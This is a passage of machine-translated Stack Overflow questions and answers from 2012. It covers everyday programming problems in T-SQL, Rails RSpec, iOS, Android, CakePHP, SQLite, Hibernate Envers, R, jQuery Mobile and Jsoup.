[customSlider addTarget:selfaction:@selector(sliderEnd:)forControlEvents:UIControlEventTouchUpInside]; 
```

现在应该在`Mainview`项目的类中定义选择器方法。

现在，在选择器方法中，您确定函数中的滑块值，并且根据其值，您可以向另一个视图添加或删除或添加按钮。您可以在将所有按钮添加到视图时存储对它们的引用，然后`superview`在滑块值建议这样做时将其删除。

希望能帮助到你。

# tsql - 不存在的 TSQL 循环

> ID：12318188
> 
> 赞同：0
> 
> 时间：2012-09-07T12:32:59.187
> 
> 标签：tsql, while-loop, exists

我有一个角色和权限表，其中包含一个名为 role_permissions 的连接表。

对于每个角色，如果该角色尚未拥有该权限，我想插入一个新权限。我的循环的问题是只有一行（角色）被更新。该循环似乎没有正确地重新评估每个循环上的子查询（它找到第一个没有权限的角色）

```
DECLARE @role_id INT

SET @role_id = (SELECT TOP 1 role_id FROM p_role_permissions WHERE NOT EXISTS (SELECT NULL FROM p_role_permissions WHERE permission_id = 57))

WHILE @role_id IS NOT NULL
BEGIN

INSERT INTO p_role_permissions (role_id, permission_id) VALUES(@role_id, 57)
-- does not appear to evaluate correctly (works only on the first loop)
SET @role_id = (SELECT TOP 1 role_id FROM p_role_permissions WHERE NOT EXISTS (SELECT NULL FROM p_role_permissions WHERE permission_id = 57))

END 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:46:24.793

好的，在这里做一些假设，但我相信你可以这样做：

获取没有权限 57 的角色：

```
INSERT INTO p_role_permissions (role_id, permission_id)
   SELECT
       rp.Id,
       57
   FROM
       (SELECT
            r.Id
         FROM roles as r
         LEFT OUTER JOIN p_role_permissions as rp
         ON r.Id = rp.Role_Id AND rp.Permission_Id = 57

         WHERE r.Id IS NULL) as nr 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:46:53.290

```
INSERT INTO p_role_permissions (role_id, permission_id) (SELECT role_id, 57 FROM p_role_permissions WHERE NOT EXISTS (SELECT NULL FROM p_role_permissions WHERE permission_id = 57)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:45:22.413

你不需要循环。您可以在一个插入语句中执行此操作。

```
;WITH RolesToAdd
     AS (SELECT role_id
         FROM   p_role_permissions /*Would be better to use a roles table here */
         EXCEPT
         SELECT role_id
         FROM   p_role_permissions
         WHERE  permission_id = 57)
INSERT INTO p_role_permissions
            (role_id,
             permission_id)
SELECT role_id,
       57
FROM   RolesToAdd 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T14:25:16.040

```
MERGE INTO p_role_permissions 
USING (SELECT DISTINCT roleid, 57 FROM p_role_permissions) AS src  
ON (p_role_permissions)  
WHEN NOT MATCHED THEN   
    INSERT p_role_permissions (role_id, permission_id)
    VALUES (role_id, 57); 
```

# ruby - Rspec - 发布 - MassAssignmentSecurity::Error

> ID：12318190
> 
> 赞同：2
> 
> 时间：2012-09-07T12:33:07.867
> 
> 标签：ruby, rspec, ruby-on-rails-3.2, mass-assignment

我有几个模型：**User**和**Article**。用户 has_many 文章和文章属于用户。

我尝试编写测试来检查`Post`方法（注意：我在我的应用程序中使用语言环境）：

```
require 'spec_helper'

describe ArticlesController do
  render_views

  before(:each) do
    @admin = FactoryGirl.create( :admin )
    @user  = FactoryGirl.create( :user )
  end

  describe "POST 'create'" do
    before(:each){ @article = FactoryGirl.create(:article) }

    describe "for signed-in admin" do
      before(:each){ test_sign_in( @admin ) }

      it "should create article" do
        expect do
          post :create, :locale => :en, :article => @article.attributes.merge( :content => "some" )
        end.should change( Article, :count ).by(1)
      end
    end
  end
end 
```

但我得到这样的错误：

```
1) ArticlesController POST 'create' for signed-in admin should create article
     ActiveModel::MassAssignmentSecurity::Error:
       Can't mass-assign protected attributes: id, user_id, created_at, updated_at
     Failure/Error: post :create, :locale => :en, :article => @article.attributes.merge( :content => "some" )
     # ./app/controllers/articles_controller.rb:15:in `create'
     # ./spec/controllers/articles_controller_spec.rb:106:in `block (5 levels) in <top (required)>'
     # ./spec/controllers/articles_controller_spec.rb:105:in `block (4 levels) in <top (required)>' 
```

我该如何解决？

我的工厂：

```
FactoryGirl.define do
  factory :user do
    sequence(:email) { |n| "email#{n}@factory.com" }
    password  'qwerty'

    factory :admin do
      admin true
    end
  end

  factory :article do
    content 'text is here'
    user
  end
end 
```

我的控制器：

```
class ArticlesController < ApplicationController
  before_filter do
    redirect_to :root unless current_user && current_user.admin?
  end

  def create
    @article = Article.new( params[:article] )

    if @article.save
      redirect_to articles_path
      flash[:success] = "It has been created!"
    else
      render 'new'                                                                       
    end
  end
end 
```

文章型号：

```
# == Schema Information
#
# Table name: articles
#
#  id         :integer          not null, primary key
#  user_id    :integer
#  content    :text
#  created_at :datetime         not null
#  updated_at :datetime         not null
#

class Article < ActiveRecord::Base
  belongs_to :user

  attr_accessible :content

  validates :content,
              :presence => { :message => :presense_message },
              :length   => {
                             :maximum => 50000,
                             :message => :max_lenght_message
                           }
end 
```

UPD：应用程序在这里：[https ://github.com/Loremaster/Chirch_app](https://github.com/Loremaster/Chirch_app)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T14:58:10.043

如果不直接测试您的代码，我不能肯定地说，但请尝试更改

```
before(:each){ @article = FactoryGirl.create(:article) } 
```

至

```
before(:each){ @article = FactoryGirl.build(:article, :user => @admin) } 
```

这样您就可以在调用 POST 之前为文章指定作者并且[不保存文章。](https://github.com/thoughtbot/factory_girl/blob/master/GETTING_STARTED.md#using-factories)此外，这条线可能也应该在你的`describe "for signed-in admin"`块内。

### 编辑

如果您更改测试代码，您`MassAssignmentSecurity::Error`的 s 将会消失，以便`build`您`:article` *预先使用*[工厂](https://github.com/Loremaster/Chirch_app/blob/master/spec/factories.rb)中定义的所有必要参数：

**规格/控制器/articles_controllers.spec**

```
describe "POST 'create'" do
  before(:each) do
    @article = FactoryGirl.build(:article, :user => @admin, :content => "some")
  end

describe "for non-signed users" do
  it "should deny access" do
    post :create, :locale => :en, :article => @article
    response.should redirect_to( root_path )
  end

  it "should not create article" do
    expect do
      post :create, :locale => :en, :article => @article
    end.should_not change( Article, :count )
  end
end

describe "for signed-in users" do
  before(:each){ test_sign_in( @user ) }

  it "should deny access" do
    post :create, :locale => :en, :article => @article
    response.should redirect_to( root_path )
  end

  it "should not create article" do
    expect do
      post :create, :locale => :en, :article => @article
    end.should_not change( Article, :count )
  end
end 
```

# objective-c - 如何调试 NSInternalInconsistencyException 试图加载不存在的笔尖？

> ID：12318191
> 
> 赞同：0
> 
> 时间：2012-09-07T12:33:12.503
> 
> 标签：objective-c, xcode4.3

```
2012-09-07 19:31:07.938 BadgerNew[2590:707] *** Terminating app due to uncaught exception 'NSInternalInconsistencyException', reason: 'Could not load NIB in bundle: 'NSBundle </var/mobile/Applications/AD11CC37-653F-44FD-B7E2-412C0DB10234/BadgerNew.app> (loaded)' with name 'FrontPageofBadger'' 
```

这里曾经是一个名为 FrontPageofBadger 的类和 xib。

但是，在整个项目中的任何地方都没有提及。

如果我搜索项目，我什么也得不到。

那么，为什么在地球上 iO 尝试加载这个所谓的 FrontPageofBadger？曾经有一个名为 FrontPageofBadger 的类。班级名称更改为 myprofile。我没有看到 ios 应该找到 frontpageofbadger 的任何地方。它没有在任何代码或 xib 中提及。

在哪里？什么样的代码会尝试加载它？

代码在模拟器中运行良好

是的，其他人也有同样的问题。我从 iPhone 等中删除了干净的构建版本。无济于事

```
-(void)startInit{
    [[NSUserDefaults standardUserDefaults] setObject:@"0" forKey:@"OnlyBookmark"];
    //[BNUtilitiesQuick AnimateSwitchingWithParent:self From:[BNUtilitiesQuick searchController] To:[BNUtilitiesQuick searchController]];

    if ([BNUtilitiesQuick searchController].view == nil) {};
    if ([BNUtilitiesQuick ListController].view == nil) {};
    if ([BNUtilitiesQuick FrontPageAje].view == nil) {}; //this is where the error happen. I 
```

FrontPageAje 是一个函数

```
+ (MyProfile *) FrontPageAje
{
    return[BNUtilitiesQuick appDelegate].SettingsMiscelaneous;
} 
```

它在这里声明：

```
@property (nonatomic, weak) IBOutlet MyProfile *SettingsMiscelaneous; 
```

很明显 FrontPageofBadger 没有出现在任何地方。

我故意尝试在开始时加载所有viewController。馊主意。我知道。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:00:35.633

我猜另一个 nib 文件，例如 MainWindow.xib 正在引用丢失的 nib 文件。查看 TabBarController 或类似的 Interfacebuilder 中引用了哪些 nib。

# android - 滚动列表视图时调整列表视图项的大小

> ID：12318199
> 
> 赞同：-2
> 
> 时间：2012-09-07T12:33:31.580
> 
> 标签：android, android-listview

我有一个问题，我已经使用布局 infleter 实现了自定义列表视图。当我滚动列表查看其项目调整为小项目时，我面临一个问题。我无法跟踪问题..请帮助。

```
class ListDownloadedAdapter extends BaseAdapter

{

 ArrayList<View> data=null;

 Context mContext=null;

 LayoutInflater mInflater;

    public ListDownloadedAdapter(ArrayList<View> arg,Context context)

    {

          mInflater = LayoutInflater.from(context);

          data=arg;

          mContext=context;

    }

    public void reverse()

    {

       Collections.reverse(data);

    }

 @Override

 public int getCount()

 {

 // TODO Auto-generated method stub

 return data.size();

}

@Override

public Object getItem(int arg0)

{

 return data.get(arg0);

 }

 @Override

 public long getItemId(int arg0) {

  return 0;

 }

  public View getView(int position, View convertView, ViewGroup parent)

  {

    ListContent holder;

    holder=new ListContent();

        //convertView=mInflater.inflate(R.layout.download_progress, parent, false);

    convertView=(View)getItem(position);

    holder.pbar=(ProgressBar)convertView.findViewById(R.id.status_progress);

    holder.statustext=(TextView)convertView.findViewById(R.id.status_text);

    holder.filesize=(TextView)convertView.findViewById(R.id.txtkbps);

    return convertView;

}

class ListContent

{

    ProgressBar pbar=null;

    TextView statustext=null,filesize=null;

}

} 
```

下面是listview实现的xml文件

```
 <ListView android:id="@+id/downloadsegmentdownloadecomplete" android:divider="@drawable/transparent"  android:layout_width="fill_parent" android:layout_height="wrap_content" android:cacheColorHint="#00000000" android:dividerHeight="0px" ></ListView> 
```

以下是膨胀单元格的 xml

```
 <?xml version="1.0" encoding="utf-8"?>

  <RelativeLayout

   android:layout_width="match_parent" android:paddingTop="5dp" android:paddingBottom="5dp"  android:layout_height="match_parent" xmlns:android="http://schemas.android.com/apk/res/android" android:layout_gravity="center|fill">

    <RelativeLayout

        android:id="@+id/completed_progresslayout"

        android:layout_width="match_parent"

        android:layout_height="wrap_content" >

        <TextView

            android:id="@+id/completed_status_text"

            android:layout_width="wrap_content"

            android:layout_height="wrap_content"

            android:layout_alignParentTop="true"

            android:layout_marginLeft="10dp"

            android:layout_toRightOf="@+id/txtpercent"

            android:focusable="false"

            android:focusableInTouchMode="false"

            android:text="filename"

            android:textColor="#686870" />

        <TextView

            android:id="@+id/completed_txtkbps"

            android:layout_width="wrap_content"

            android:layout_height="wrap_content"

            android:layout_alignParentRight="true"

            android:layout_below="@+id/completed_status_text"

            android:layout_marginRight="10dp"

            android:text="kbps"

            android:textColor="#b0b0b8" />

    </RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:44:05.053

很抱歉，您对适配器的整个实现都是错误的。

适配器应该只存储数据（字符串、整数，也许是游标），而不是视图本身。对于您要实现的目标，我建议您扩展 ArrayAdapter 并仅覆盖 getView()

就像是：

```
 @Override
    public View getView(int position, View convertView, ViewGroup parent) {

    if (convertView == null)
        convertView = createNewView();
    Holder h = (Holder)convertView.getTag();

    h.textView1.setText( .... // from here you put the data into the existing views.

    return convertView;

    // then the new view
    private View createNewView() {

    // Instantiate view
    View v = getLayoutInflater().inflate(R.layout.myView, null);
    Holder h = new Holder();
    v.setTag(h);

    // point to the views
    h.textView1 = (TextView) findViewById(R.id.title);
    // carry on for the other views....

    return v;
    } 
```

这对你有意义吗？

# objective-c - 在自定义视图中重现 tableView 委托行为

> ID：12318207
> 
> 赞同：0
> 
> 时间：2012-09-07T12:34:03.450
> 
> 标签：objective-c, ios, delegates, performselector, uitableview

我正在尝试开发一个模仿 UITableView 控件行为的控件。我已经定义了一个委托协议如下：

```
@protocol HPSChoiceDelegate

- (void)choiceView:(HPSChoice *)choiceView didSelectChoice:(NSNumber*)selectedIndex;

@end 
```

用户可以在主控制视图中点击子视图。我有 TapGesture 识别器在主控制视图中触发方法。我把这些连接起来是这样的：

```
UITapGestureRecognizer *containerTap = 
        [[UITapGestureRecognizer alloc] initWithTarget:self
                                                action:@selector(didSelectChoice:)]; 
```

然后我在视图中有一个方法，它试图在委托中调用正确的方法。视图中的方法如下所示：

```
-(void)didSelectChoice:(UITapGestureRecognizer*)sender
{
    NSNumber* selectedIndex = [NSNumber numberWithInt:sender.view.tag];

    [(id)self.delegate performSelector:@selector(didSelectChoice:) withObject:selectedIndex afterDelay:0.0f];
} 
```

在委托控制器中，我定义了以下方法：

```
- (void)choiceView:(HPSChoice *)choiceView didSelectChoice:(NSNumber*)selectedChoice
{
    NSLog(@"HPSFormController didSelectChoice:(HPSChoice*)choiceView tag = %@",[[choiceView class] description]);
} 
```

这一切都会编译，当我点击控件时，会在视图中调用 didSelectChoice，然后调用委托中的方法。但是，委托方法崩溃并出现以下错误：

```
-[HPSFormController didSelectChoice:]: unrecognized selector sent to instance 0x29b4e0 
```

我该如何解决？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:45:50.293

例如，如果您的视图被调用`HPSChoiceView`，您还需要说明它的委托是您创建该视图的控制器。

例如，在委托控制器中的某个地方（`HPSFormController`我想）你需要做：

```
HPSChoiceView* choiceView = // alloc-init here
// self refers to an instance of HPSFormController at run-time
choiceView.delegate = self; 
```

这意味着每次您在该视图中点击时，控制器都会响应该点击，因为它已被设置为其委托。

此外，您调用了错误的选择器。而不是打电话

```
[self.delegate performSelector:@selector(didSelectChoice:) withObject:selectedIndex afterDelay:0.0f]; 
```

称呼

```
[self.delegate performSelector:@selector(choiceView:didSelectChoice:) withObject:choiceView withObject:selectedIndex]; 
```

`choiceView`可以从中检索`sender.view`。`sender`是一个例子，`UITapGestureRecognizer`因此您可以检索被点击的视图。

要了解什么是选择器，您可以查看[Objective C](https://stackoverflow.com/questions/738622/selectors-in-objective-c)和[Apple doc](http://developer.apple.com/library/ios/#documentation/cocoa/conceptual/objectivec/Chapters/ocSelectors.html)中的选择器。

说这个，我也会为你更改选择器 delegate `HPSChoiceDelegate`。因此，例如，我称之为（为了清楚起见）：

```
- (void)didSelectChoiceView:(HPSChoice *)choiceView withSelectedIndex:(NSNumber*)selectedIndex; 
```

如果你使用它，选择器将是`didSelectChoiceView:withSelectedIndex:`. 注意冒号！！

此外，我会在调用委托方法之前添加一个控件，就像@Cirylle 所建议的那样。该控件允许您验证您是否设置了委托（我的答案的第一部分），并且委托可以响应该选择器，因为它已正确实现。

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:47:23.290

该方法正在崩溃，因为您正在调用

```
didSelectChoice: 
```

而您定义的方法是

```
choiceView:didSelectChoice: 
```

I believe that you can fix this by calling:

```
[(id)self.delegate performSelector:@selector(choiceView:didSelectChoice:) withObject:choiceView withObject:selectedIndex]; 
```

You would have to get the choiceView in your didSelectChoice: method of course.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:46:46.660

应该充当委托的类必须声明并符合`HPSChoiceDelegate`协议，并且它还必须将自己注册为您`UITableView`的“ish 类”的委托。

另外，尝试更改为`@selector(choiceView:didSelectChoice:)`.

# php - 如何在 PHP 中创建一个同时处理 1000 个用户的实时博客平台？

> ID：12318216
> 
> 赞同：0
> 
> 时间：2012-09-07T12:34:23.273
> 
> 标签：php, jquery, mysql, ajax, cakephp

我正在开发必须使用 CakePhp 或 Php 实现的实时博客平台。它必须一次处理 1000 个用户。

我通过在 mysql 表中插入新数据时使用 ajax 自动刷新内容来完成此操作。问题是它每 10 秒访问一次 DB 以检查过去 60 秒内是否插入了数据。如果计数结果为 1，那么我编写了刷新内容的程序。但这感觉不像是优化的解决方案。

有什么方法可以实现吗？

我的代码 - 对 livefeed 控制器的 ajax 调用：

```
var auto_refresh = setInterval(
  function()
  { 
    $.post('/blog/posts/liveFeed', function(data) {
    if(data >0){
      alert(data);
      $('#content').load(window.location.href);
    }
  });
  return false;
}, 10000); 
```

post.php 中的 Livefeed 控制器：

```
public function liveFeed() {
  $res=$this->Post->query('SELECT count(*) AS data FROM posts where TIME_TO_SEC(TIMEDIFF(NOW(), created)) < 60');
  echo $res[0][0]['data'];
} 
```

我不擅长cakePhp。如果我的代码看起来不专业，请原谅我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:38:17.087

您可以使用一些缓存。

使用[varnish](https://www.varnish-cache.org/)之类的 http-cache并在每次撰写新文章时重置它 - 否则只需从 varnish 提供 html 页面。这应该会大大提高您的速度和可能的用户。

您仍然可以使用 ajax 请求每 10 秒重新加载一次页面 - 它只会加载缓存的页面，而不是每次都查询数据库。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:38:31.043

如果我是你，我会在数据库和 webapp 之间实现一些缓存逻辑。否则，当登录的用户过多，同时查询大量的博文时，就会出现一些记忆问题。

看这个[stackoverflow的帖子](https://stackoverflow.com/q/1058006/390462)和[CakePHP, v2.0, Cache的官方文档](http://book.cakephp.org/2.0/en/core-libraries/caching.html)

它在`app/Config/bootstrap.php`CakePHP 的文件中完成：

```
<?php
Cache::config('short', array(
    'engine' => 'File',
    'duration' => '+1 hours',
    'path' => CACHE,
    'prefix' => 'cake_short_'
));

// long
Cache::config('long', array(
    'engine' => 'File',
    'duration' => '+1 week',
    'probability' => 100,
    'path' => CACHE . 'long' . DS,
)); 
```

您列出了几个选项：FileCache、[ApcCache](http://php.net/apc)、[Wincache](http://php.net/wincache)、[XcacheEngine](http://xcache.lighttpd.net/)、[MemcacheEngine](http://php.net/memcache)、[RedisEngine](https://github.com/nicolasff/phpredis)。当然，您可以尝试任何缓存库，因为 cakePHP 足够灵活，可以集成它。

# iphone - iOS：在 SQLite 数据库中搜索缓慢

> ID：12318218
> 
> 赞同：0
> 
> 时间：2012-09-07T12:34:31.957
> 
> 标签：iphone, objective-c, ios, xcode, ipad

我用 SQL 数据库创建了一个字典应用程序，但问题是用户在`UISearchBar`搜索过程中搜索单词时非常慢！为什么会这样？这是我的代码：

```
- (void)updateSearchString:(NSString*)aSearchString
{
    [self.myTable reloadData];
}

- (void)searchBar:(UISearchBar *)theSearchBar textDidChange:(NSString *)searchText {

    searchbar.showsCancelButton = YES;

    if([searchText length] > 0) {

        dbClass=[[DB alloc]init];
        [dbClass searchWord:searchText];

    }else
    {
        dbClass=[[DB alloc]init];
        [dbClass searchWord:@""];
    }

    [self.myTable reloadData];

} 
```

表视图代码：

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    appClass = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    NSLog(@"%d",appClass.wordList.count);
    return  appClass.wordList.count;

}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    static NSString *CellIdentifier = @"Cell";

    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (cell == nil) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    appClass = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    readerClass = (Reader *)[appClass.wordList objectAtIndex:indexPath.row];

    cell.textLabel.text  = readerClass.Name;

    return cell;
} 
```

编辑：

```
 -(void)searchWord:(NSString *)txt{

    NSMutableArray *DB_Array = [[NSMutableArray alloc] init];

    NSString *dbPath=[self getDBPath];

    if (sqlite3_open([dbPath UTF8String], &database) == SQLITE_OK) {

        NSString *sql =[NSString stringWithFormat:@"SELECT * FROM DIC Where Name LIKE \'%@%%\' ",txt];

        //        NSLog(@"%@",sql);

        sqlite3_stmt *compiledStatement;

        if(sqlite3_prepare_v2(database, [sql UTF8String] , -1, &compiledStatement, NULL) == SQLITE_OK) {
            while(sqlite3_step(compiledStatement) == SQLITE_ROW) {

                NSInteger oid = sqlite3_column_int(compiledStatement, 0);

                const char* f1 = (const char*)sqlite3_column_text(compiledStatement, 1);
                NSString *oName = f1 == NULL ? nil : [[NSString alloc] initWithUTF8String:f1];

                const char* f2 = (const char*)sqlite3_column_text(compiledStatement, 2);
                NSString *oMean = f2 == NULL ? nil : [[NSString alloc] initWithUTF8String:f2];

                const char* f3 = (const char*)sqlite3_column_text(compiledStatement, 3);
                NSString *oPron = f3 == NULL ? nil : [[NSString alloc] initWithUTF8String:f3];

                NSInteger bm = sqlite3_column_int(compiledStatement, 5);

                readerClass = [[Reader alloc]initWithReadDB:oid Name:oName Mean:oMean Pron:oPron bookMark:bm];

                [DB_Array addObject:readerClass];

            }
        }
        else {
            NSLog(@"Error retrieving data from database.");
        }
        sqlite3_close(database);
    }
    else {

        NSLog(@"Error: Can't open database!");
        NSLog(@" DB Name %@",viewController.dbName);
    }

    AppDelegate *appDelegateClass = (AppDelegate *)[[UIApplication sharedApplication] delegate];
    [appDelegateClass.wordList removeAllObjects];
    [appDelegateClass.wordList=DB_Array mutableCopy];
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:32:08.680

首先，您要搜索的字段应该是一个索引，否则您将回归到对数据库中所有记录的线性搜索。

其次，您不应该以这种方式使用 LIKE，因为您很可能会回归到线性搜索。相反，您应该对数据进行反规范化，以便您可以更轻松地搜索子字符串。您最终会得到一个更大的数据库，但您的搜索会更快。

如果没有有关您的特定搜索的更多详细信息，则很难判断。

最后，即使我们有具体的信息，我们也只能做这么多。

要确定性能瓶颈在哪里，以及更改是否真正解决了它，唯一真正的方法是使用性能工具（如 Instruments）来收集数据，并运行大量测试来确定到底发生了什么。

真的，像这样的论坛只能做这么多。人们可以识别出效率极低的算法，但我们在发现性能问题方面真的很糟糕。这就是我们拥有分析工具的原因。学会使用它们，你的生活会简单得多。

祝你好运！

**编辑**

解决注释：使用`LIKE`不是字符串比较。嗯，“喜欢”一个字符串比较:-)。它接受通配符，并且必须做更多的工作才能进行比较。它很慢，很容易降级为线性搜索。

在谈论非规范化时，我的意思是将`Name`字段分解为一个可搜索的字段。删除大小写和变音符号。甚至可能根据长度将每个名称分成 N 个名称。使用“可搜索”字段作为真实数据项的映射。数据库非常适合这一点。

或者，通过进行一些分析，您可能可以确定在某些字符数（猜测大约 3-4 个）之后，前缀匹配的数量足够小，可以进行有效的搜索。然后，您可以对这些进行排列。

此外，从编辑后的代码来看，似乎每次都在打开数据库。 **那可以是杀手锏。** 除此之外，我对使用直接 SQLite API 了解不多，所以我无法评论那部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:44:11.853

我不会做的第一件事是每次用户在搜索栏中更改某些内容时分配空间......在*viewDidLoad*方法中初始化数据库......

但我认为最好将 UITableView 的必要信息保存在 NSDictionary 或其他东西中并搜索此 Array/Dictionary ...我已经在我的一个应用程序中做到了这一点，它工作得很好（表有超过 7000 行)

格里兹克里斯

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:49:59.027

此外，您应该在后台线程上进行搜索，以防止锁定 UI。这样，用户会感觉更快。

以下是如何做到这一点： [在后台线程上搜索](https://stackoverflow.com/questions/4421181/searching-on-a-background-thread-iphone)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-09T18:13:53.800

Your predicate `LIKE '%word%'` will not use the index, *`LIKE 'word%'`*, however, will.

I suggest making the index case-insensitive (`COLLATE NOCASE`), which would be expected from a dictionary lookup.

# hibernate - Hibernate Envers：如何获取给定修订版和给定实体类的修订类型信息

> ID：12318219
> 
> 赞同：3
> 
> 时间：2012-09-07T12:34:33.377
> 
> 标签：hibernate, hibernate-envers

我正在使用 Hibernate envers 3.6.3.Final。我可以审计表，我可以看到`_audit`表中填充了`revision_number`,`revision_type`和实体数据。我正在创建一个历史页面，我想在其中显示所有修订条目，以便当用户单击修订 ID 时，我可以显示实体数据以及修订类型，即添加、删除或修改。我正在尝试使用`AuditQuery`，但我不确定如何获取`revision_type`给定修订版和给定实体类的信息。有可能在`AuditQuery`吗？

我可以通过编写 Hibernate 查询来获取“RevisionType”信息。但我想为此重用任何现有的框架 api。以另一种方式，我将不同的“RevisionType”作为条件传递给`AuditQuery` （即删除、插入和更新的多个查询）并检查是否得到任何结果，但这不是有效的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-10-01T07:57:21.477

对于现在的价值。我遇到了同样的问题，并且能够通过使用*AuditQueryCreator#forRevisionsOfEntity*方法来获取修订类型，如下所示：

```
List<Object[]> resultList = auditReader.createQuery()
    .forRevisionsOfEntity(entityClass, entityClass.getName(), false, true)
    .add(AuditEntity.revisionNumber().eq(revision)).getResultList(); 
```

这将返回有关指定修订的数组三元组更改列表。数组三元组包含实体、实体信息以及最后的修订类型。

确保将*AuditQueryCreator#forRevisionsOfEntity的**selectEntitiesOnly*参数设置为*false*。如果设置为 *true*，该方法将仅返回实体对象列表。

 ***这里使用 Hibernate Envers 版本 4.2.2。***

# r - 子集二进制矩阵

> ID：12318226
> 
> 赞同：-3
> 
> 时间：2012-09-07T12:34:58.960
> 
> 标签：r, stat

我有这个二进制矩阵

```
a0=rep(1,40)
a=rep(0:1,20)
b=c(rep(1,20),rep(0,20))
c0=c(rep(0,12),rep(1,28))
c1=c(rep(1,5),rep(0,35))
c2=c(rep(1,8),rep(0,32))
c3=c(rep(1,23),rep(0,17))
da=matrix(cbind(a0,a,b,c0,c1,c2,c3),nrow=40,ncol=7) 
```

我需要将此矩阵子集化为具有相同列数和不同行数（例如 85% 对 15%）的两个子集（矩阵），但在修剪过程中，您可以记住这两个子集没有共线性。

我遇到的问题。当我使用 da 子集时

```
ind <- sample(1:nrow(da), trunc(85*nrow(da)/100)) 
trda <- da[ind,] 
teda <- da[-ind,] 
```

我得到这些子集之一不是全等级。

有人可以向我解释如何在不产生共线性的情况下对它们进行子集化吗？这只是一个例子。我正在处理大矩阵

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T09:29:56.733

由于您的行中只有零和一，因此共线行是相同的行。

通过沿列粘贴计算行字符串：

```
> das = apply(da,1,paste,collapse="")
> das
 [1] "1010111" "1110111" "1010111" "1110111" "1010111" "1110011" "1010011"
 [8] "1110011" "1010001" "1110001" "1010001" "1110001" "1011001" "1111001"
[15] "1011001" "1111001" "1011001" "1111001" "1011001" "1111001" "1001001"
[22] "1101001" "1001001" "1101000" "1001000" "1101000" "1001000" "1101000"
[29] "1001000" "1101000" "1001000" "1101000" "1001000" "1101000" "1001000"
[36] "1101000" "1001000" "1101000" "1001000" "1101000" 
```

然后快速测试是否可以完成是任何字符串是否出现超过两次：

```
> any(table(das)>2)
[1] TRUE 
```

因为如果有两个以上，那么您的一个矩阵将至少有两个相同的行。例如，您在这里有八个 1001000 行。

如果可以的话，要进行实际的拆分，您只需将出现两次的每一行中的一行放入每个矩阵中，然后使用您喜欢的任何方法来拆分其余的行。

我们在这里正确吗？

# javascript - jquery mobile listview刷新相同的列表丢失样式

> ID：12318228
> 
> 赞同：1
> 
> 时间：2012-09-07T12:35:11.590
> 
> 标签：javascript, jquery, css, jquery-mobile

我正在尝试更新从列表传递到另一个列表的 ul 列表的内容。
第一个列表是从调用 ajax 请求的搜索表单生成的。它的样式正确。
对于第二个列表，我在列表上使用 empty() 并从第一个列表中获取要搜索的参数（通过 ajax）作为链接属性

```
$('.myLink').live("vclick", function() {
    var param= $(this).attr('id');
    ... 
```

该功能正在运行。但是第二个列表没有 jquery mobile 样式。

在 pageshow 我正在刷新列表

```
$('#listID').listview('refresh'); 
```

但是 pageshow 仅在我生成第一个列表时触发，而不是第二个（与第一个在同一 ul 中）。

我尝试了 pageinit、pagecreate、pagechange 和 pageshow，但是当我更新列表时它们都没有触发。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T16:08:09.830

在您更新它的 HTML 之后刷新列表。就像是：

```
$("#listID").append($("<li />").text("Some Text")).listview("refresh"); 
```

这是一个演示：http: [//jsfiddle.net/R98La/](http://jsfiddle.net/R98La/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:00:11.520

试试这个

```
$('#listID').listview('refresh');
$(".ui-page").trigger("create"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-21T11:44:40.440

固定更改整个项目：现在我有 2 个单页和 1 个多页。将列表放在一个页面中解决了这个问题。

# java - Jsoup 访问 HTML 选择标签

> ID：12318233
> 
> 赞同：4
> 
> 时间：2012-09-07T12:35:20.253
> 
> 标签：java, html, jsoup

我是 jsoup 的新手，在使用 html 标签时遇到了一些麻烦。我需要根据它们包含的文本获取选择列表选项的值属性。例如：

```
'<select id="list">
<option value="0">First value</option>
<option value="1">Second value</option>
<option value="2">Third value</option>
</select>' 
```

您是否知道如果 jsoup 获得“第二个值”作为搜索参数，我如何告诉它返回值“1”？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-14T12:40:53.407

这可能会帮助你..

```
String demo = "<select id='list'><option value='0'>First value</option><option value='1'>Second value</option><option value='2'>Third value</option></select>";

        Document document = Jsoup.parse(demo);
        Elements options = document.select("select > option");

        for(Element element : options)
        {
            if(element.text().equalsIgnoreCase("second value"))
            {
                System.out.println(element.attr("value"));
            }

        } 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-08T15:16:18.967

这是另一个解决方案：

```
public String searchAttribute(Element element, String str)
{
    Elements lists = element.select("[id=list]");

    for( Element e : lists )
    {
        Elements result = e.select("option:contains(" + str + ")");

        if( !result.isEmpty() )
        {
            return result.first().attr("value");
        }
    }

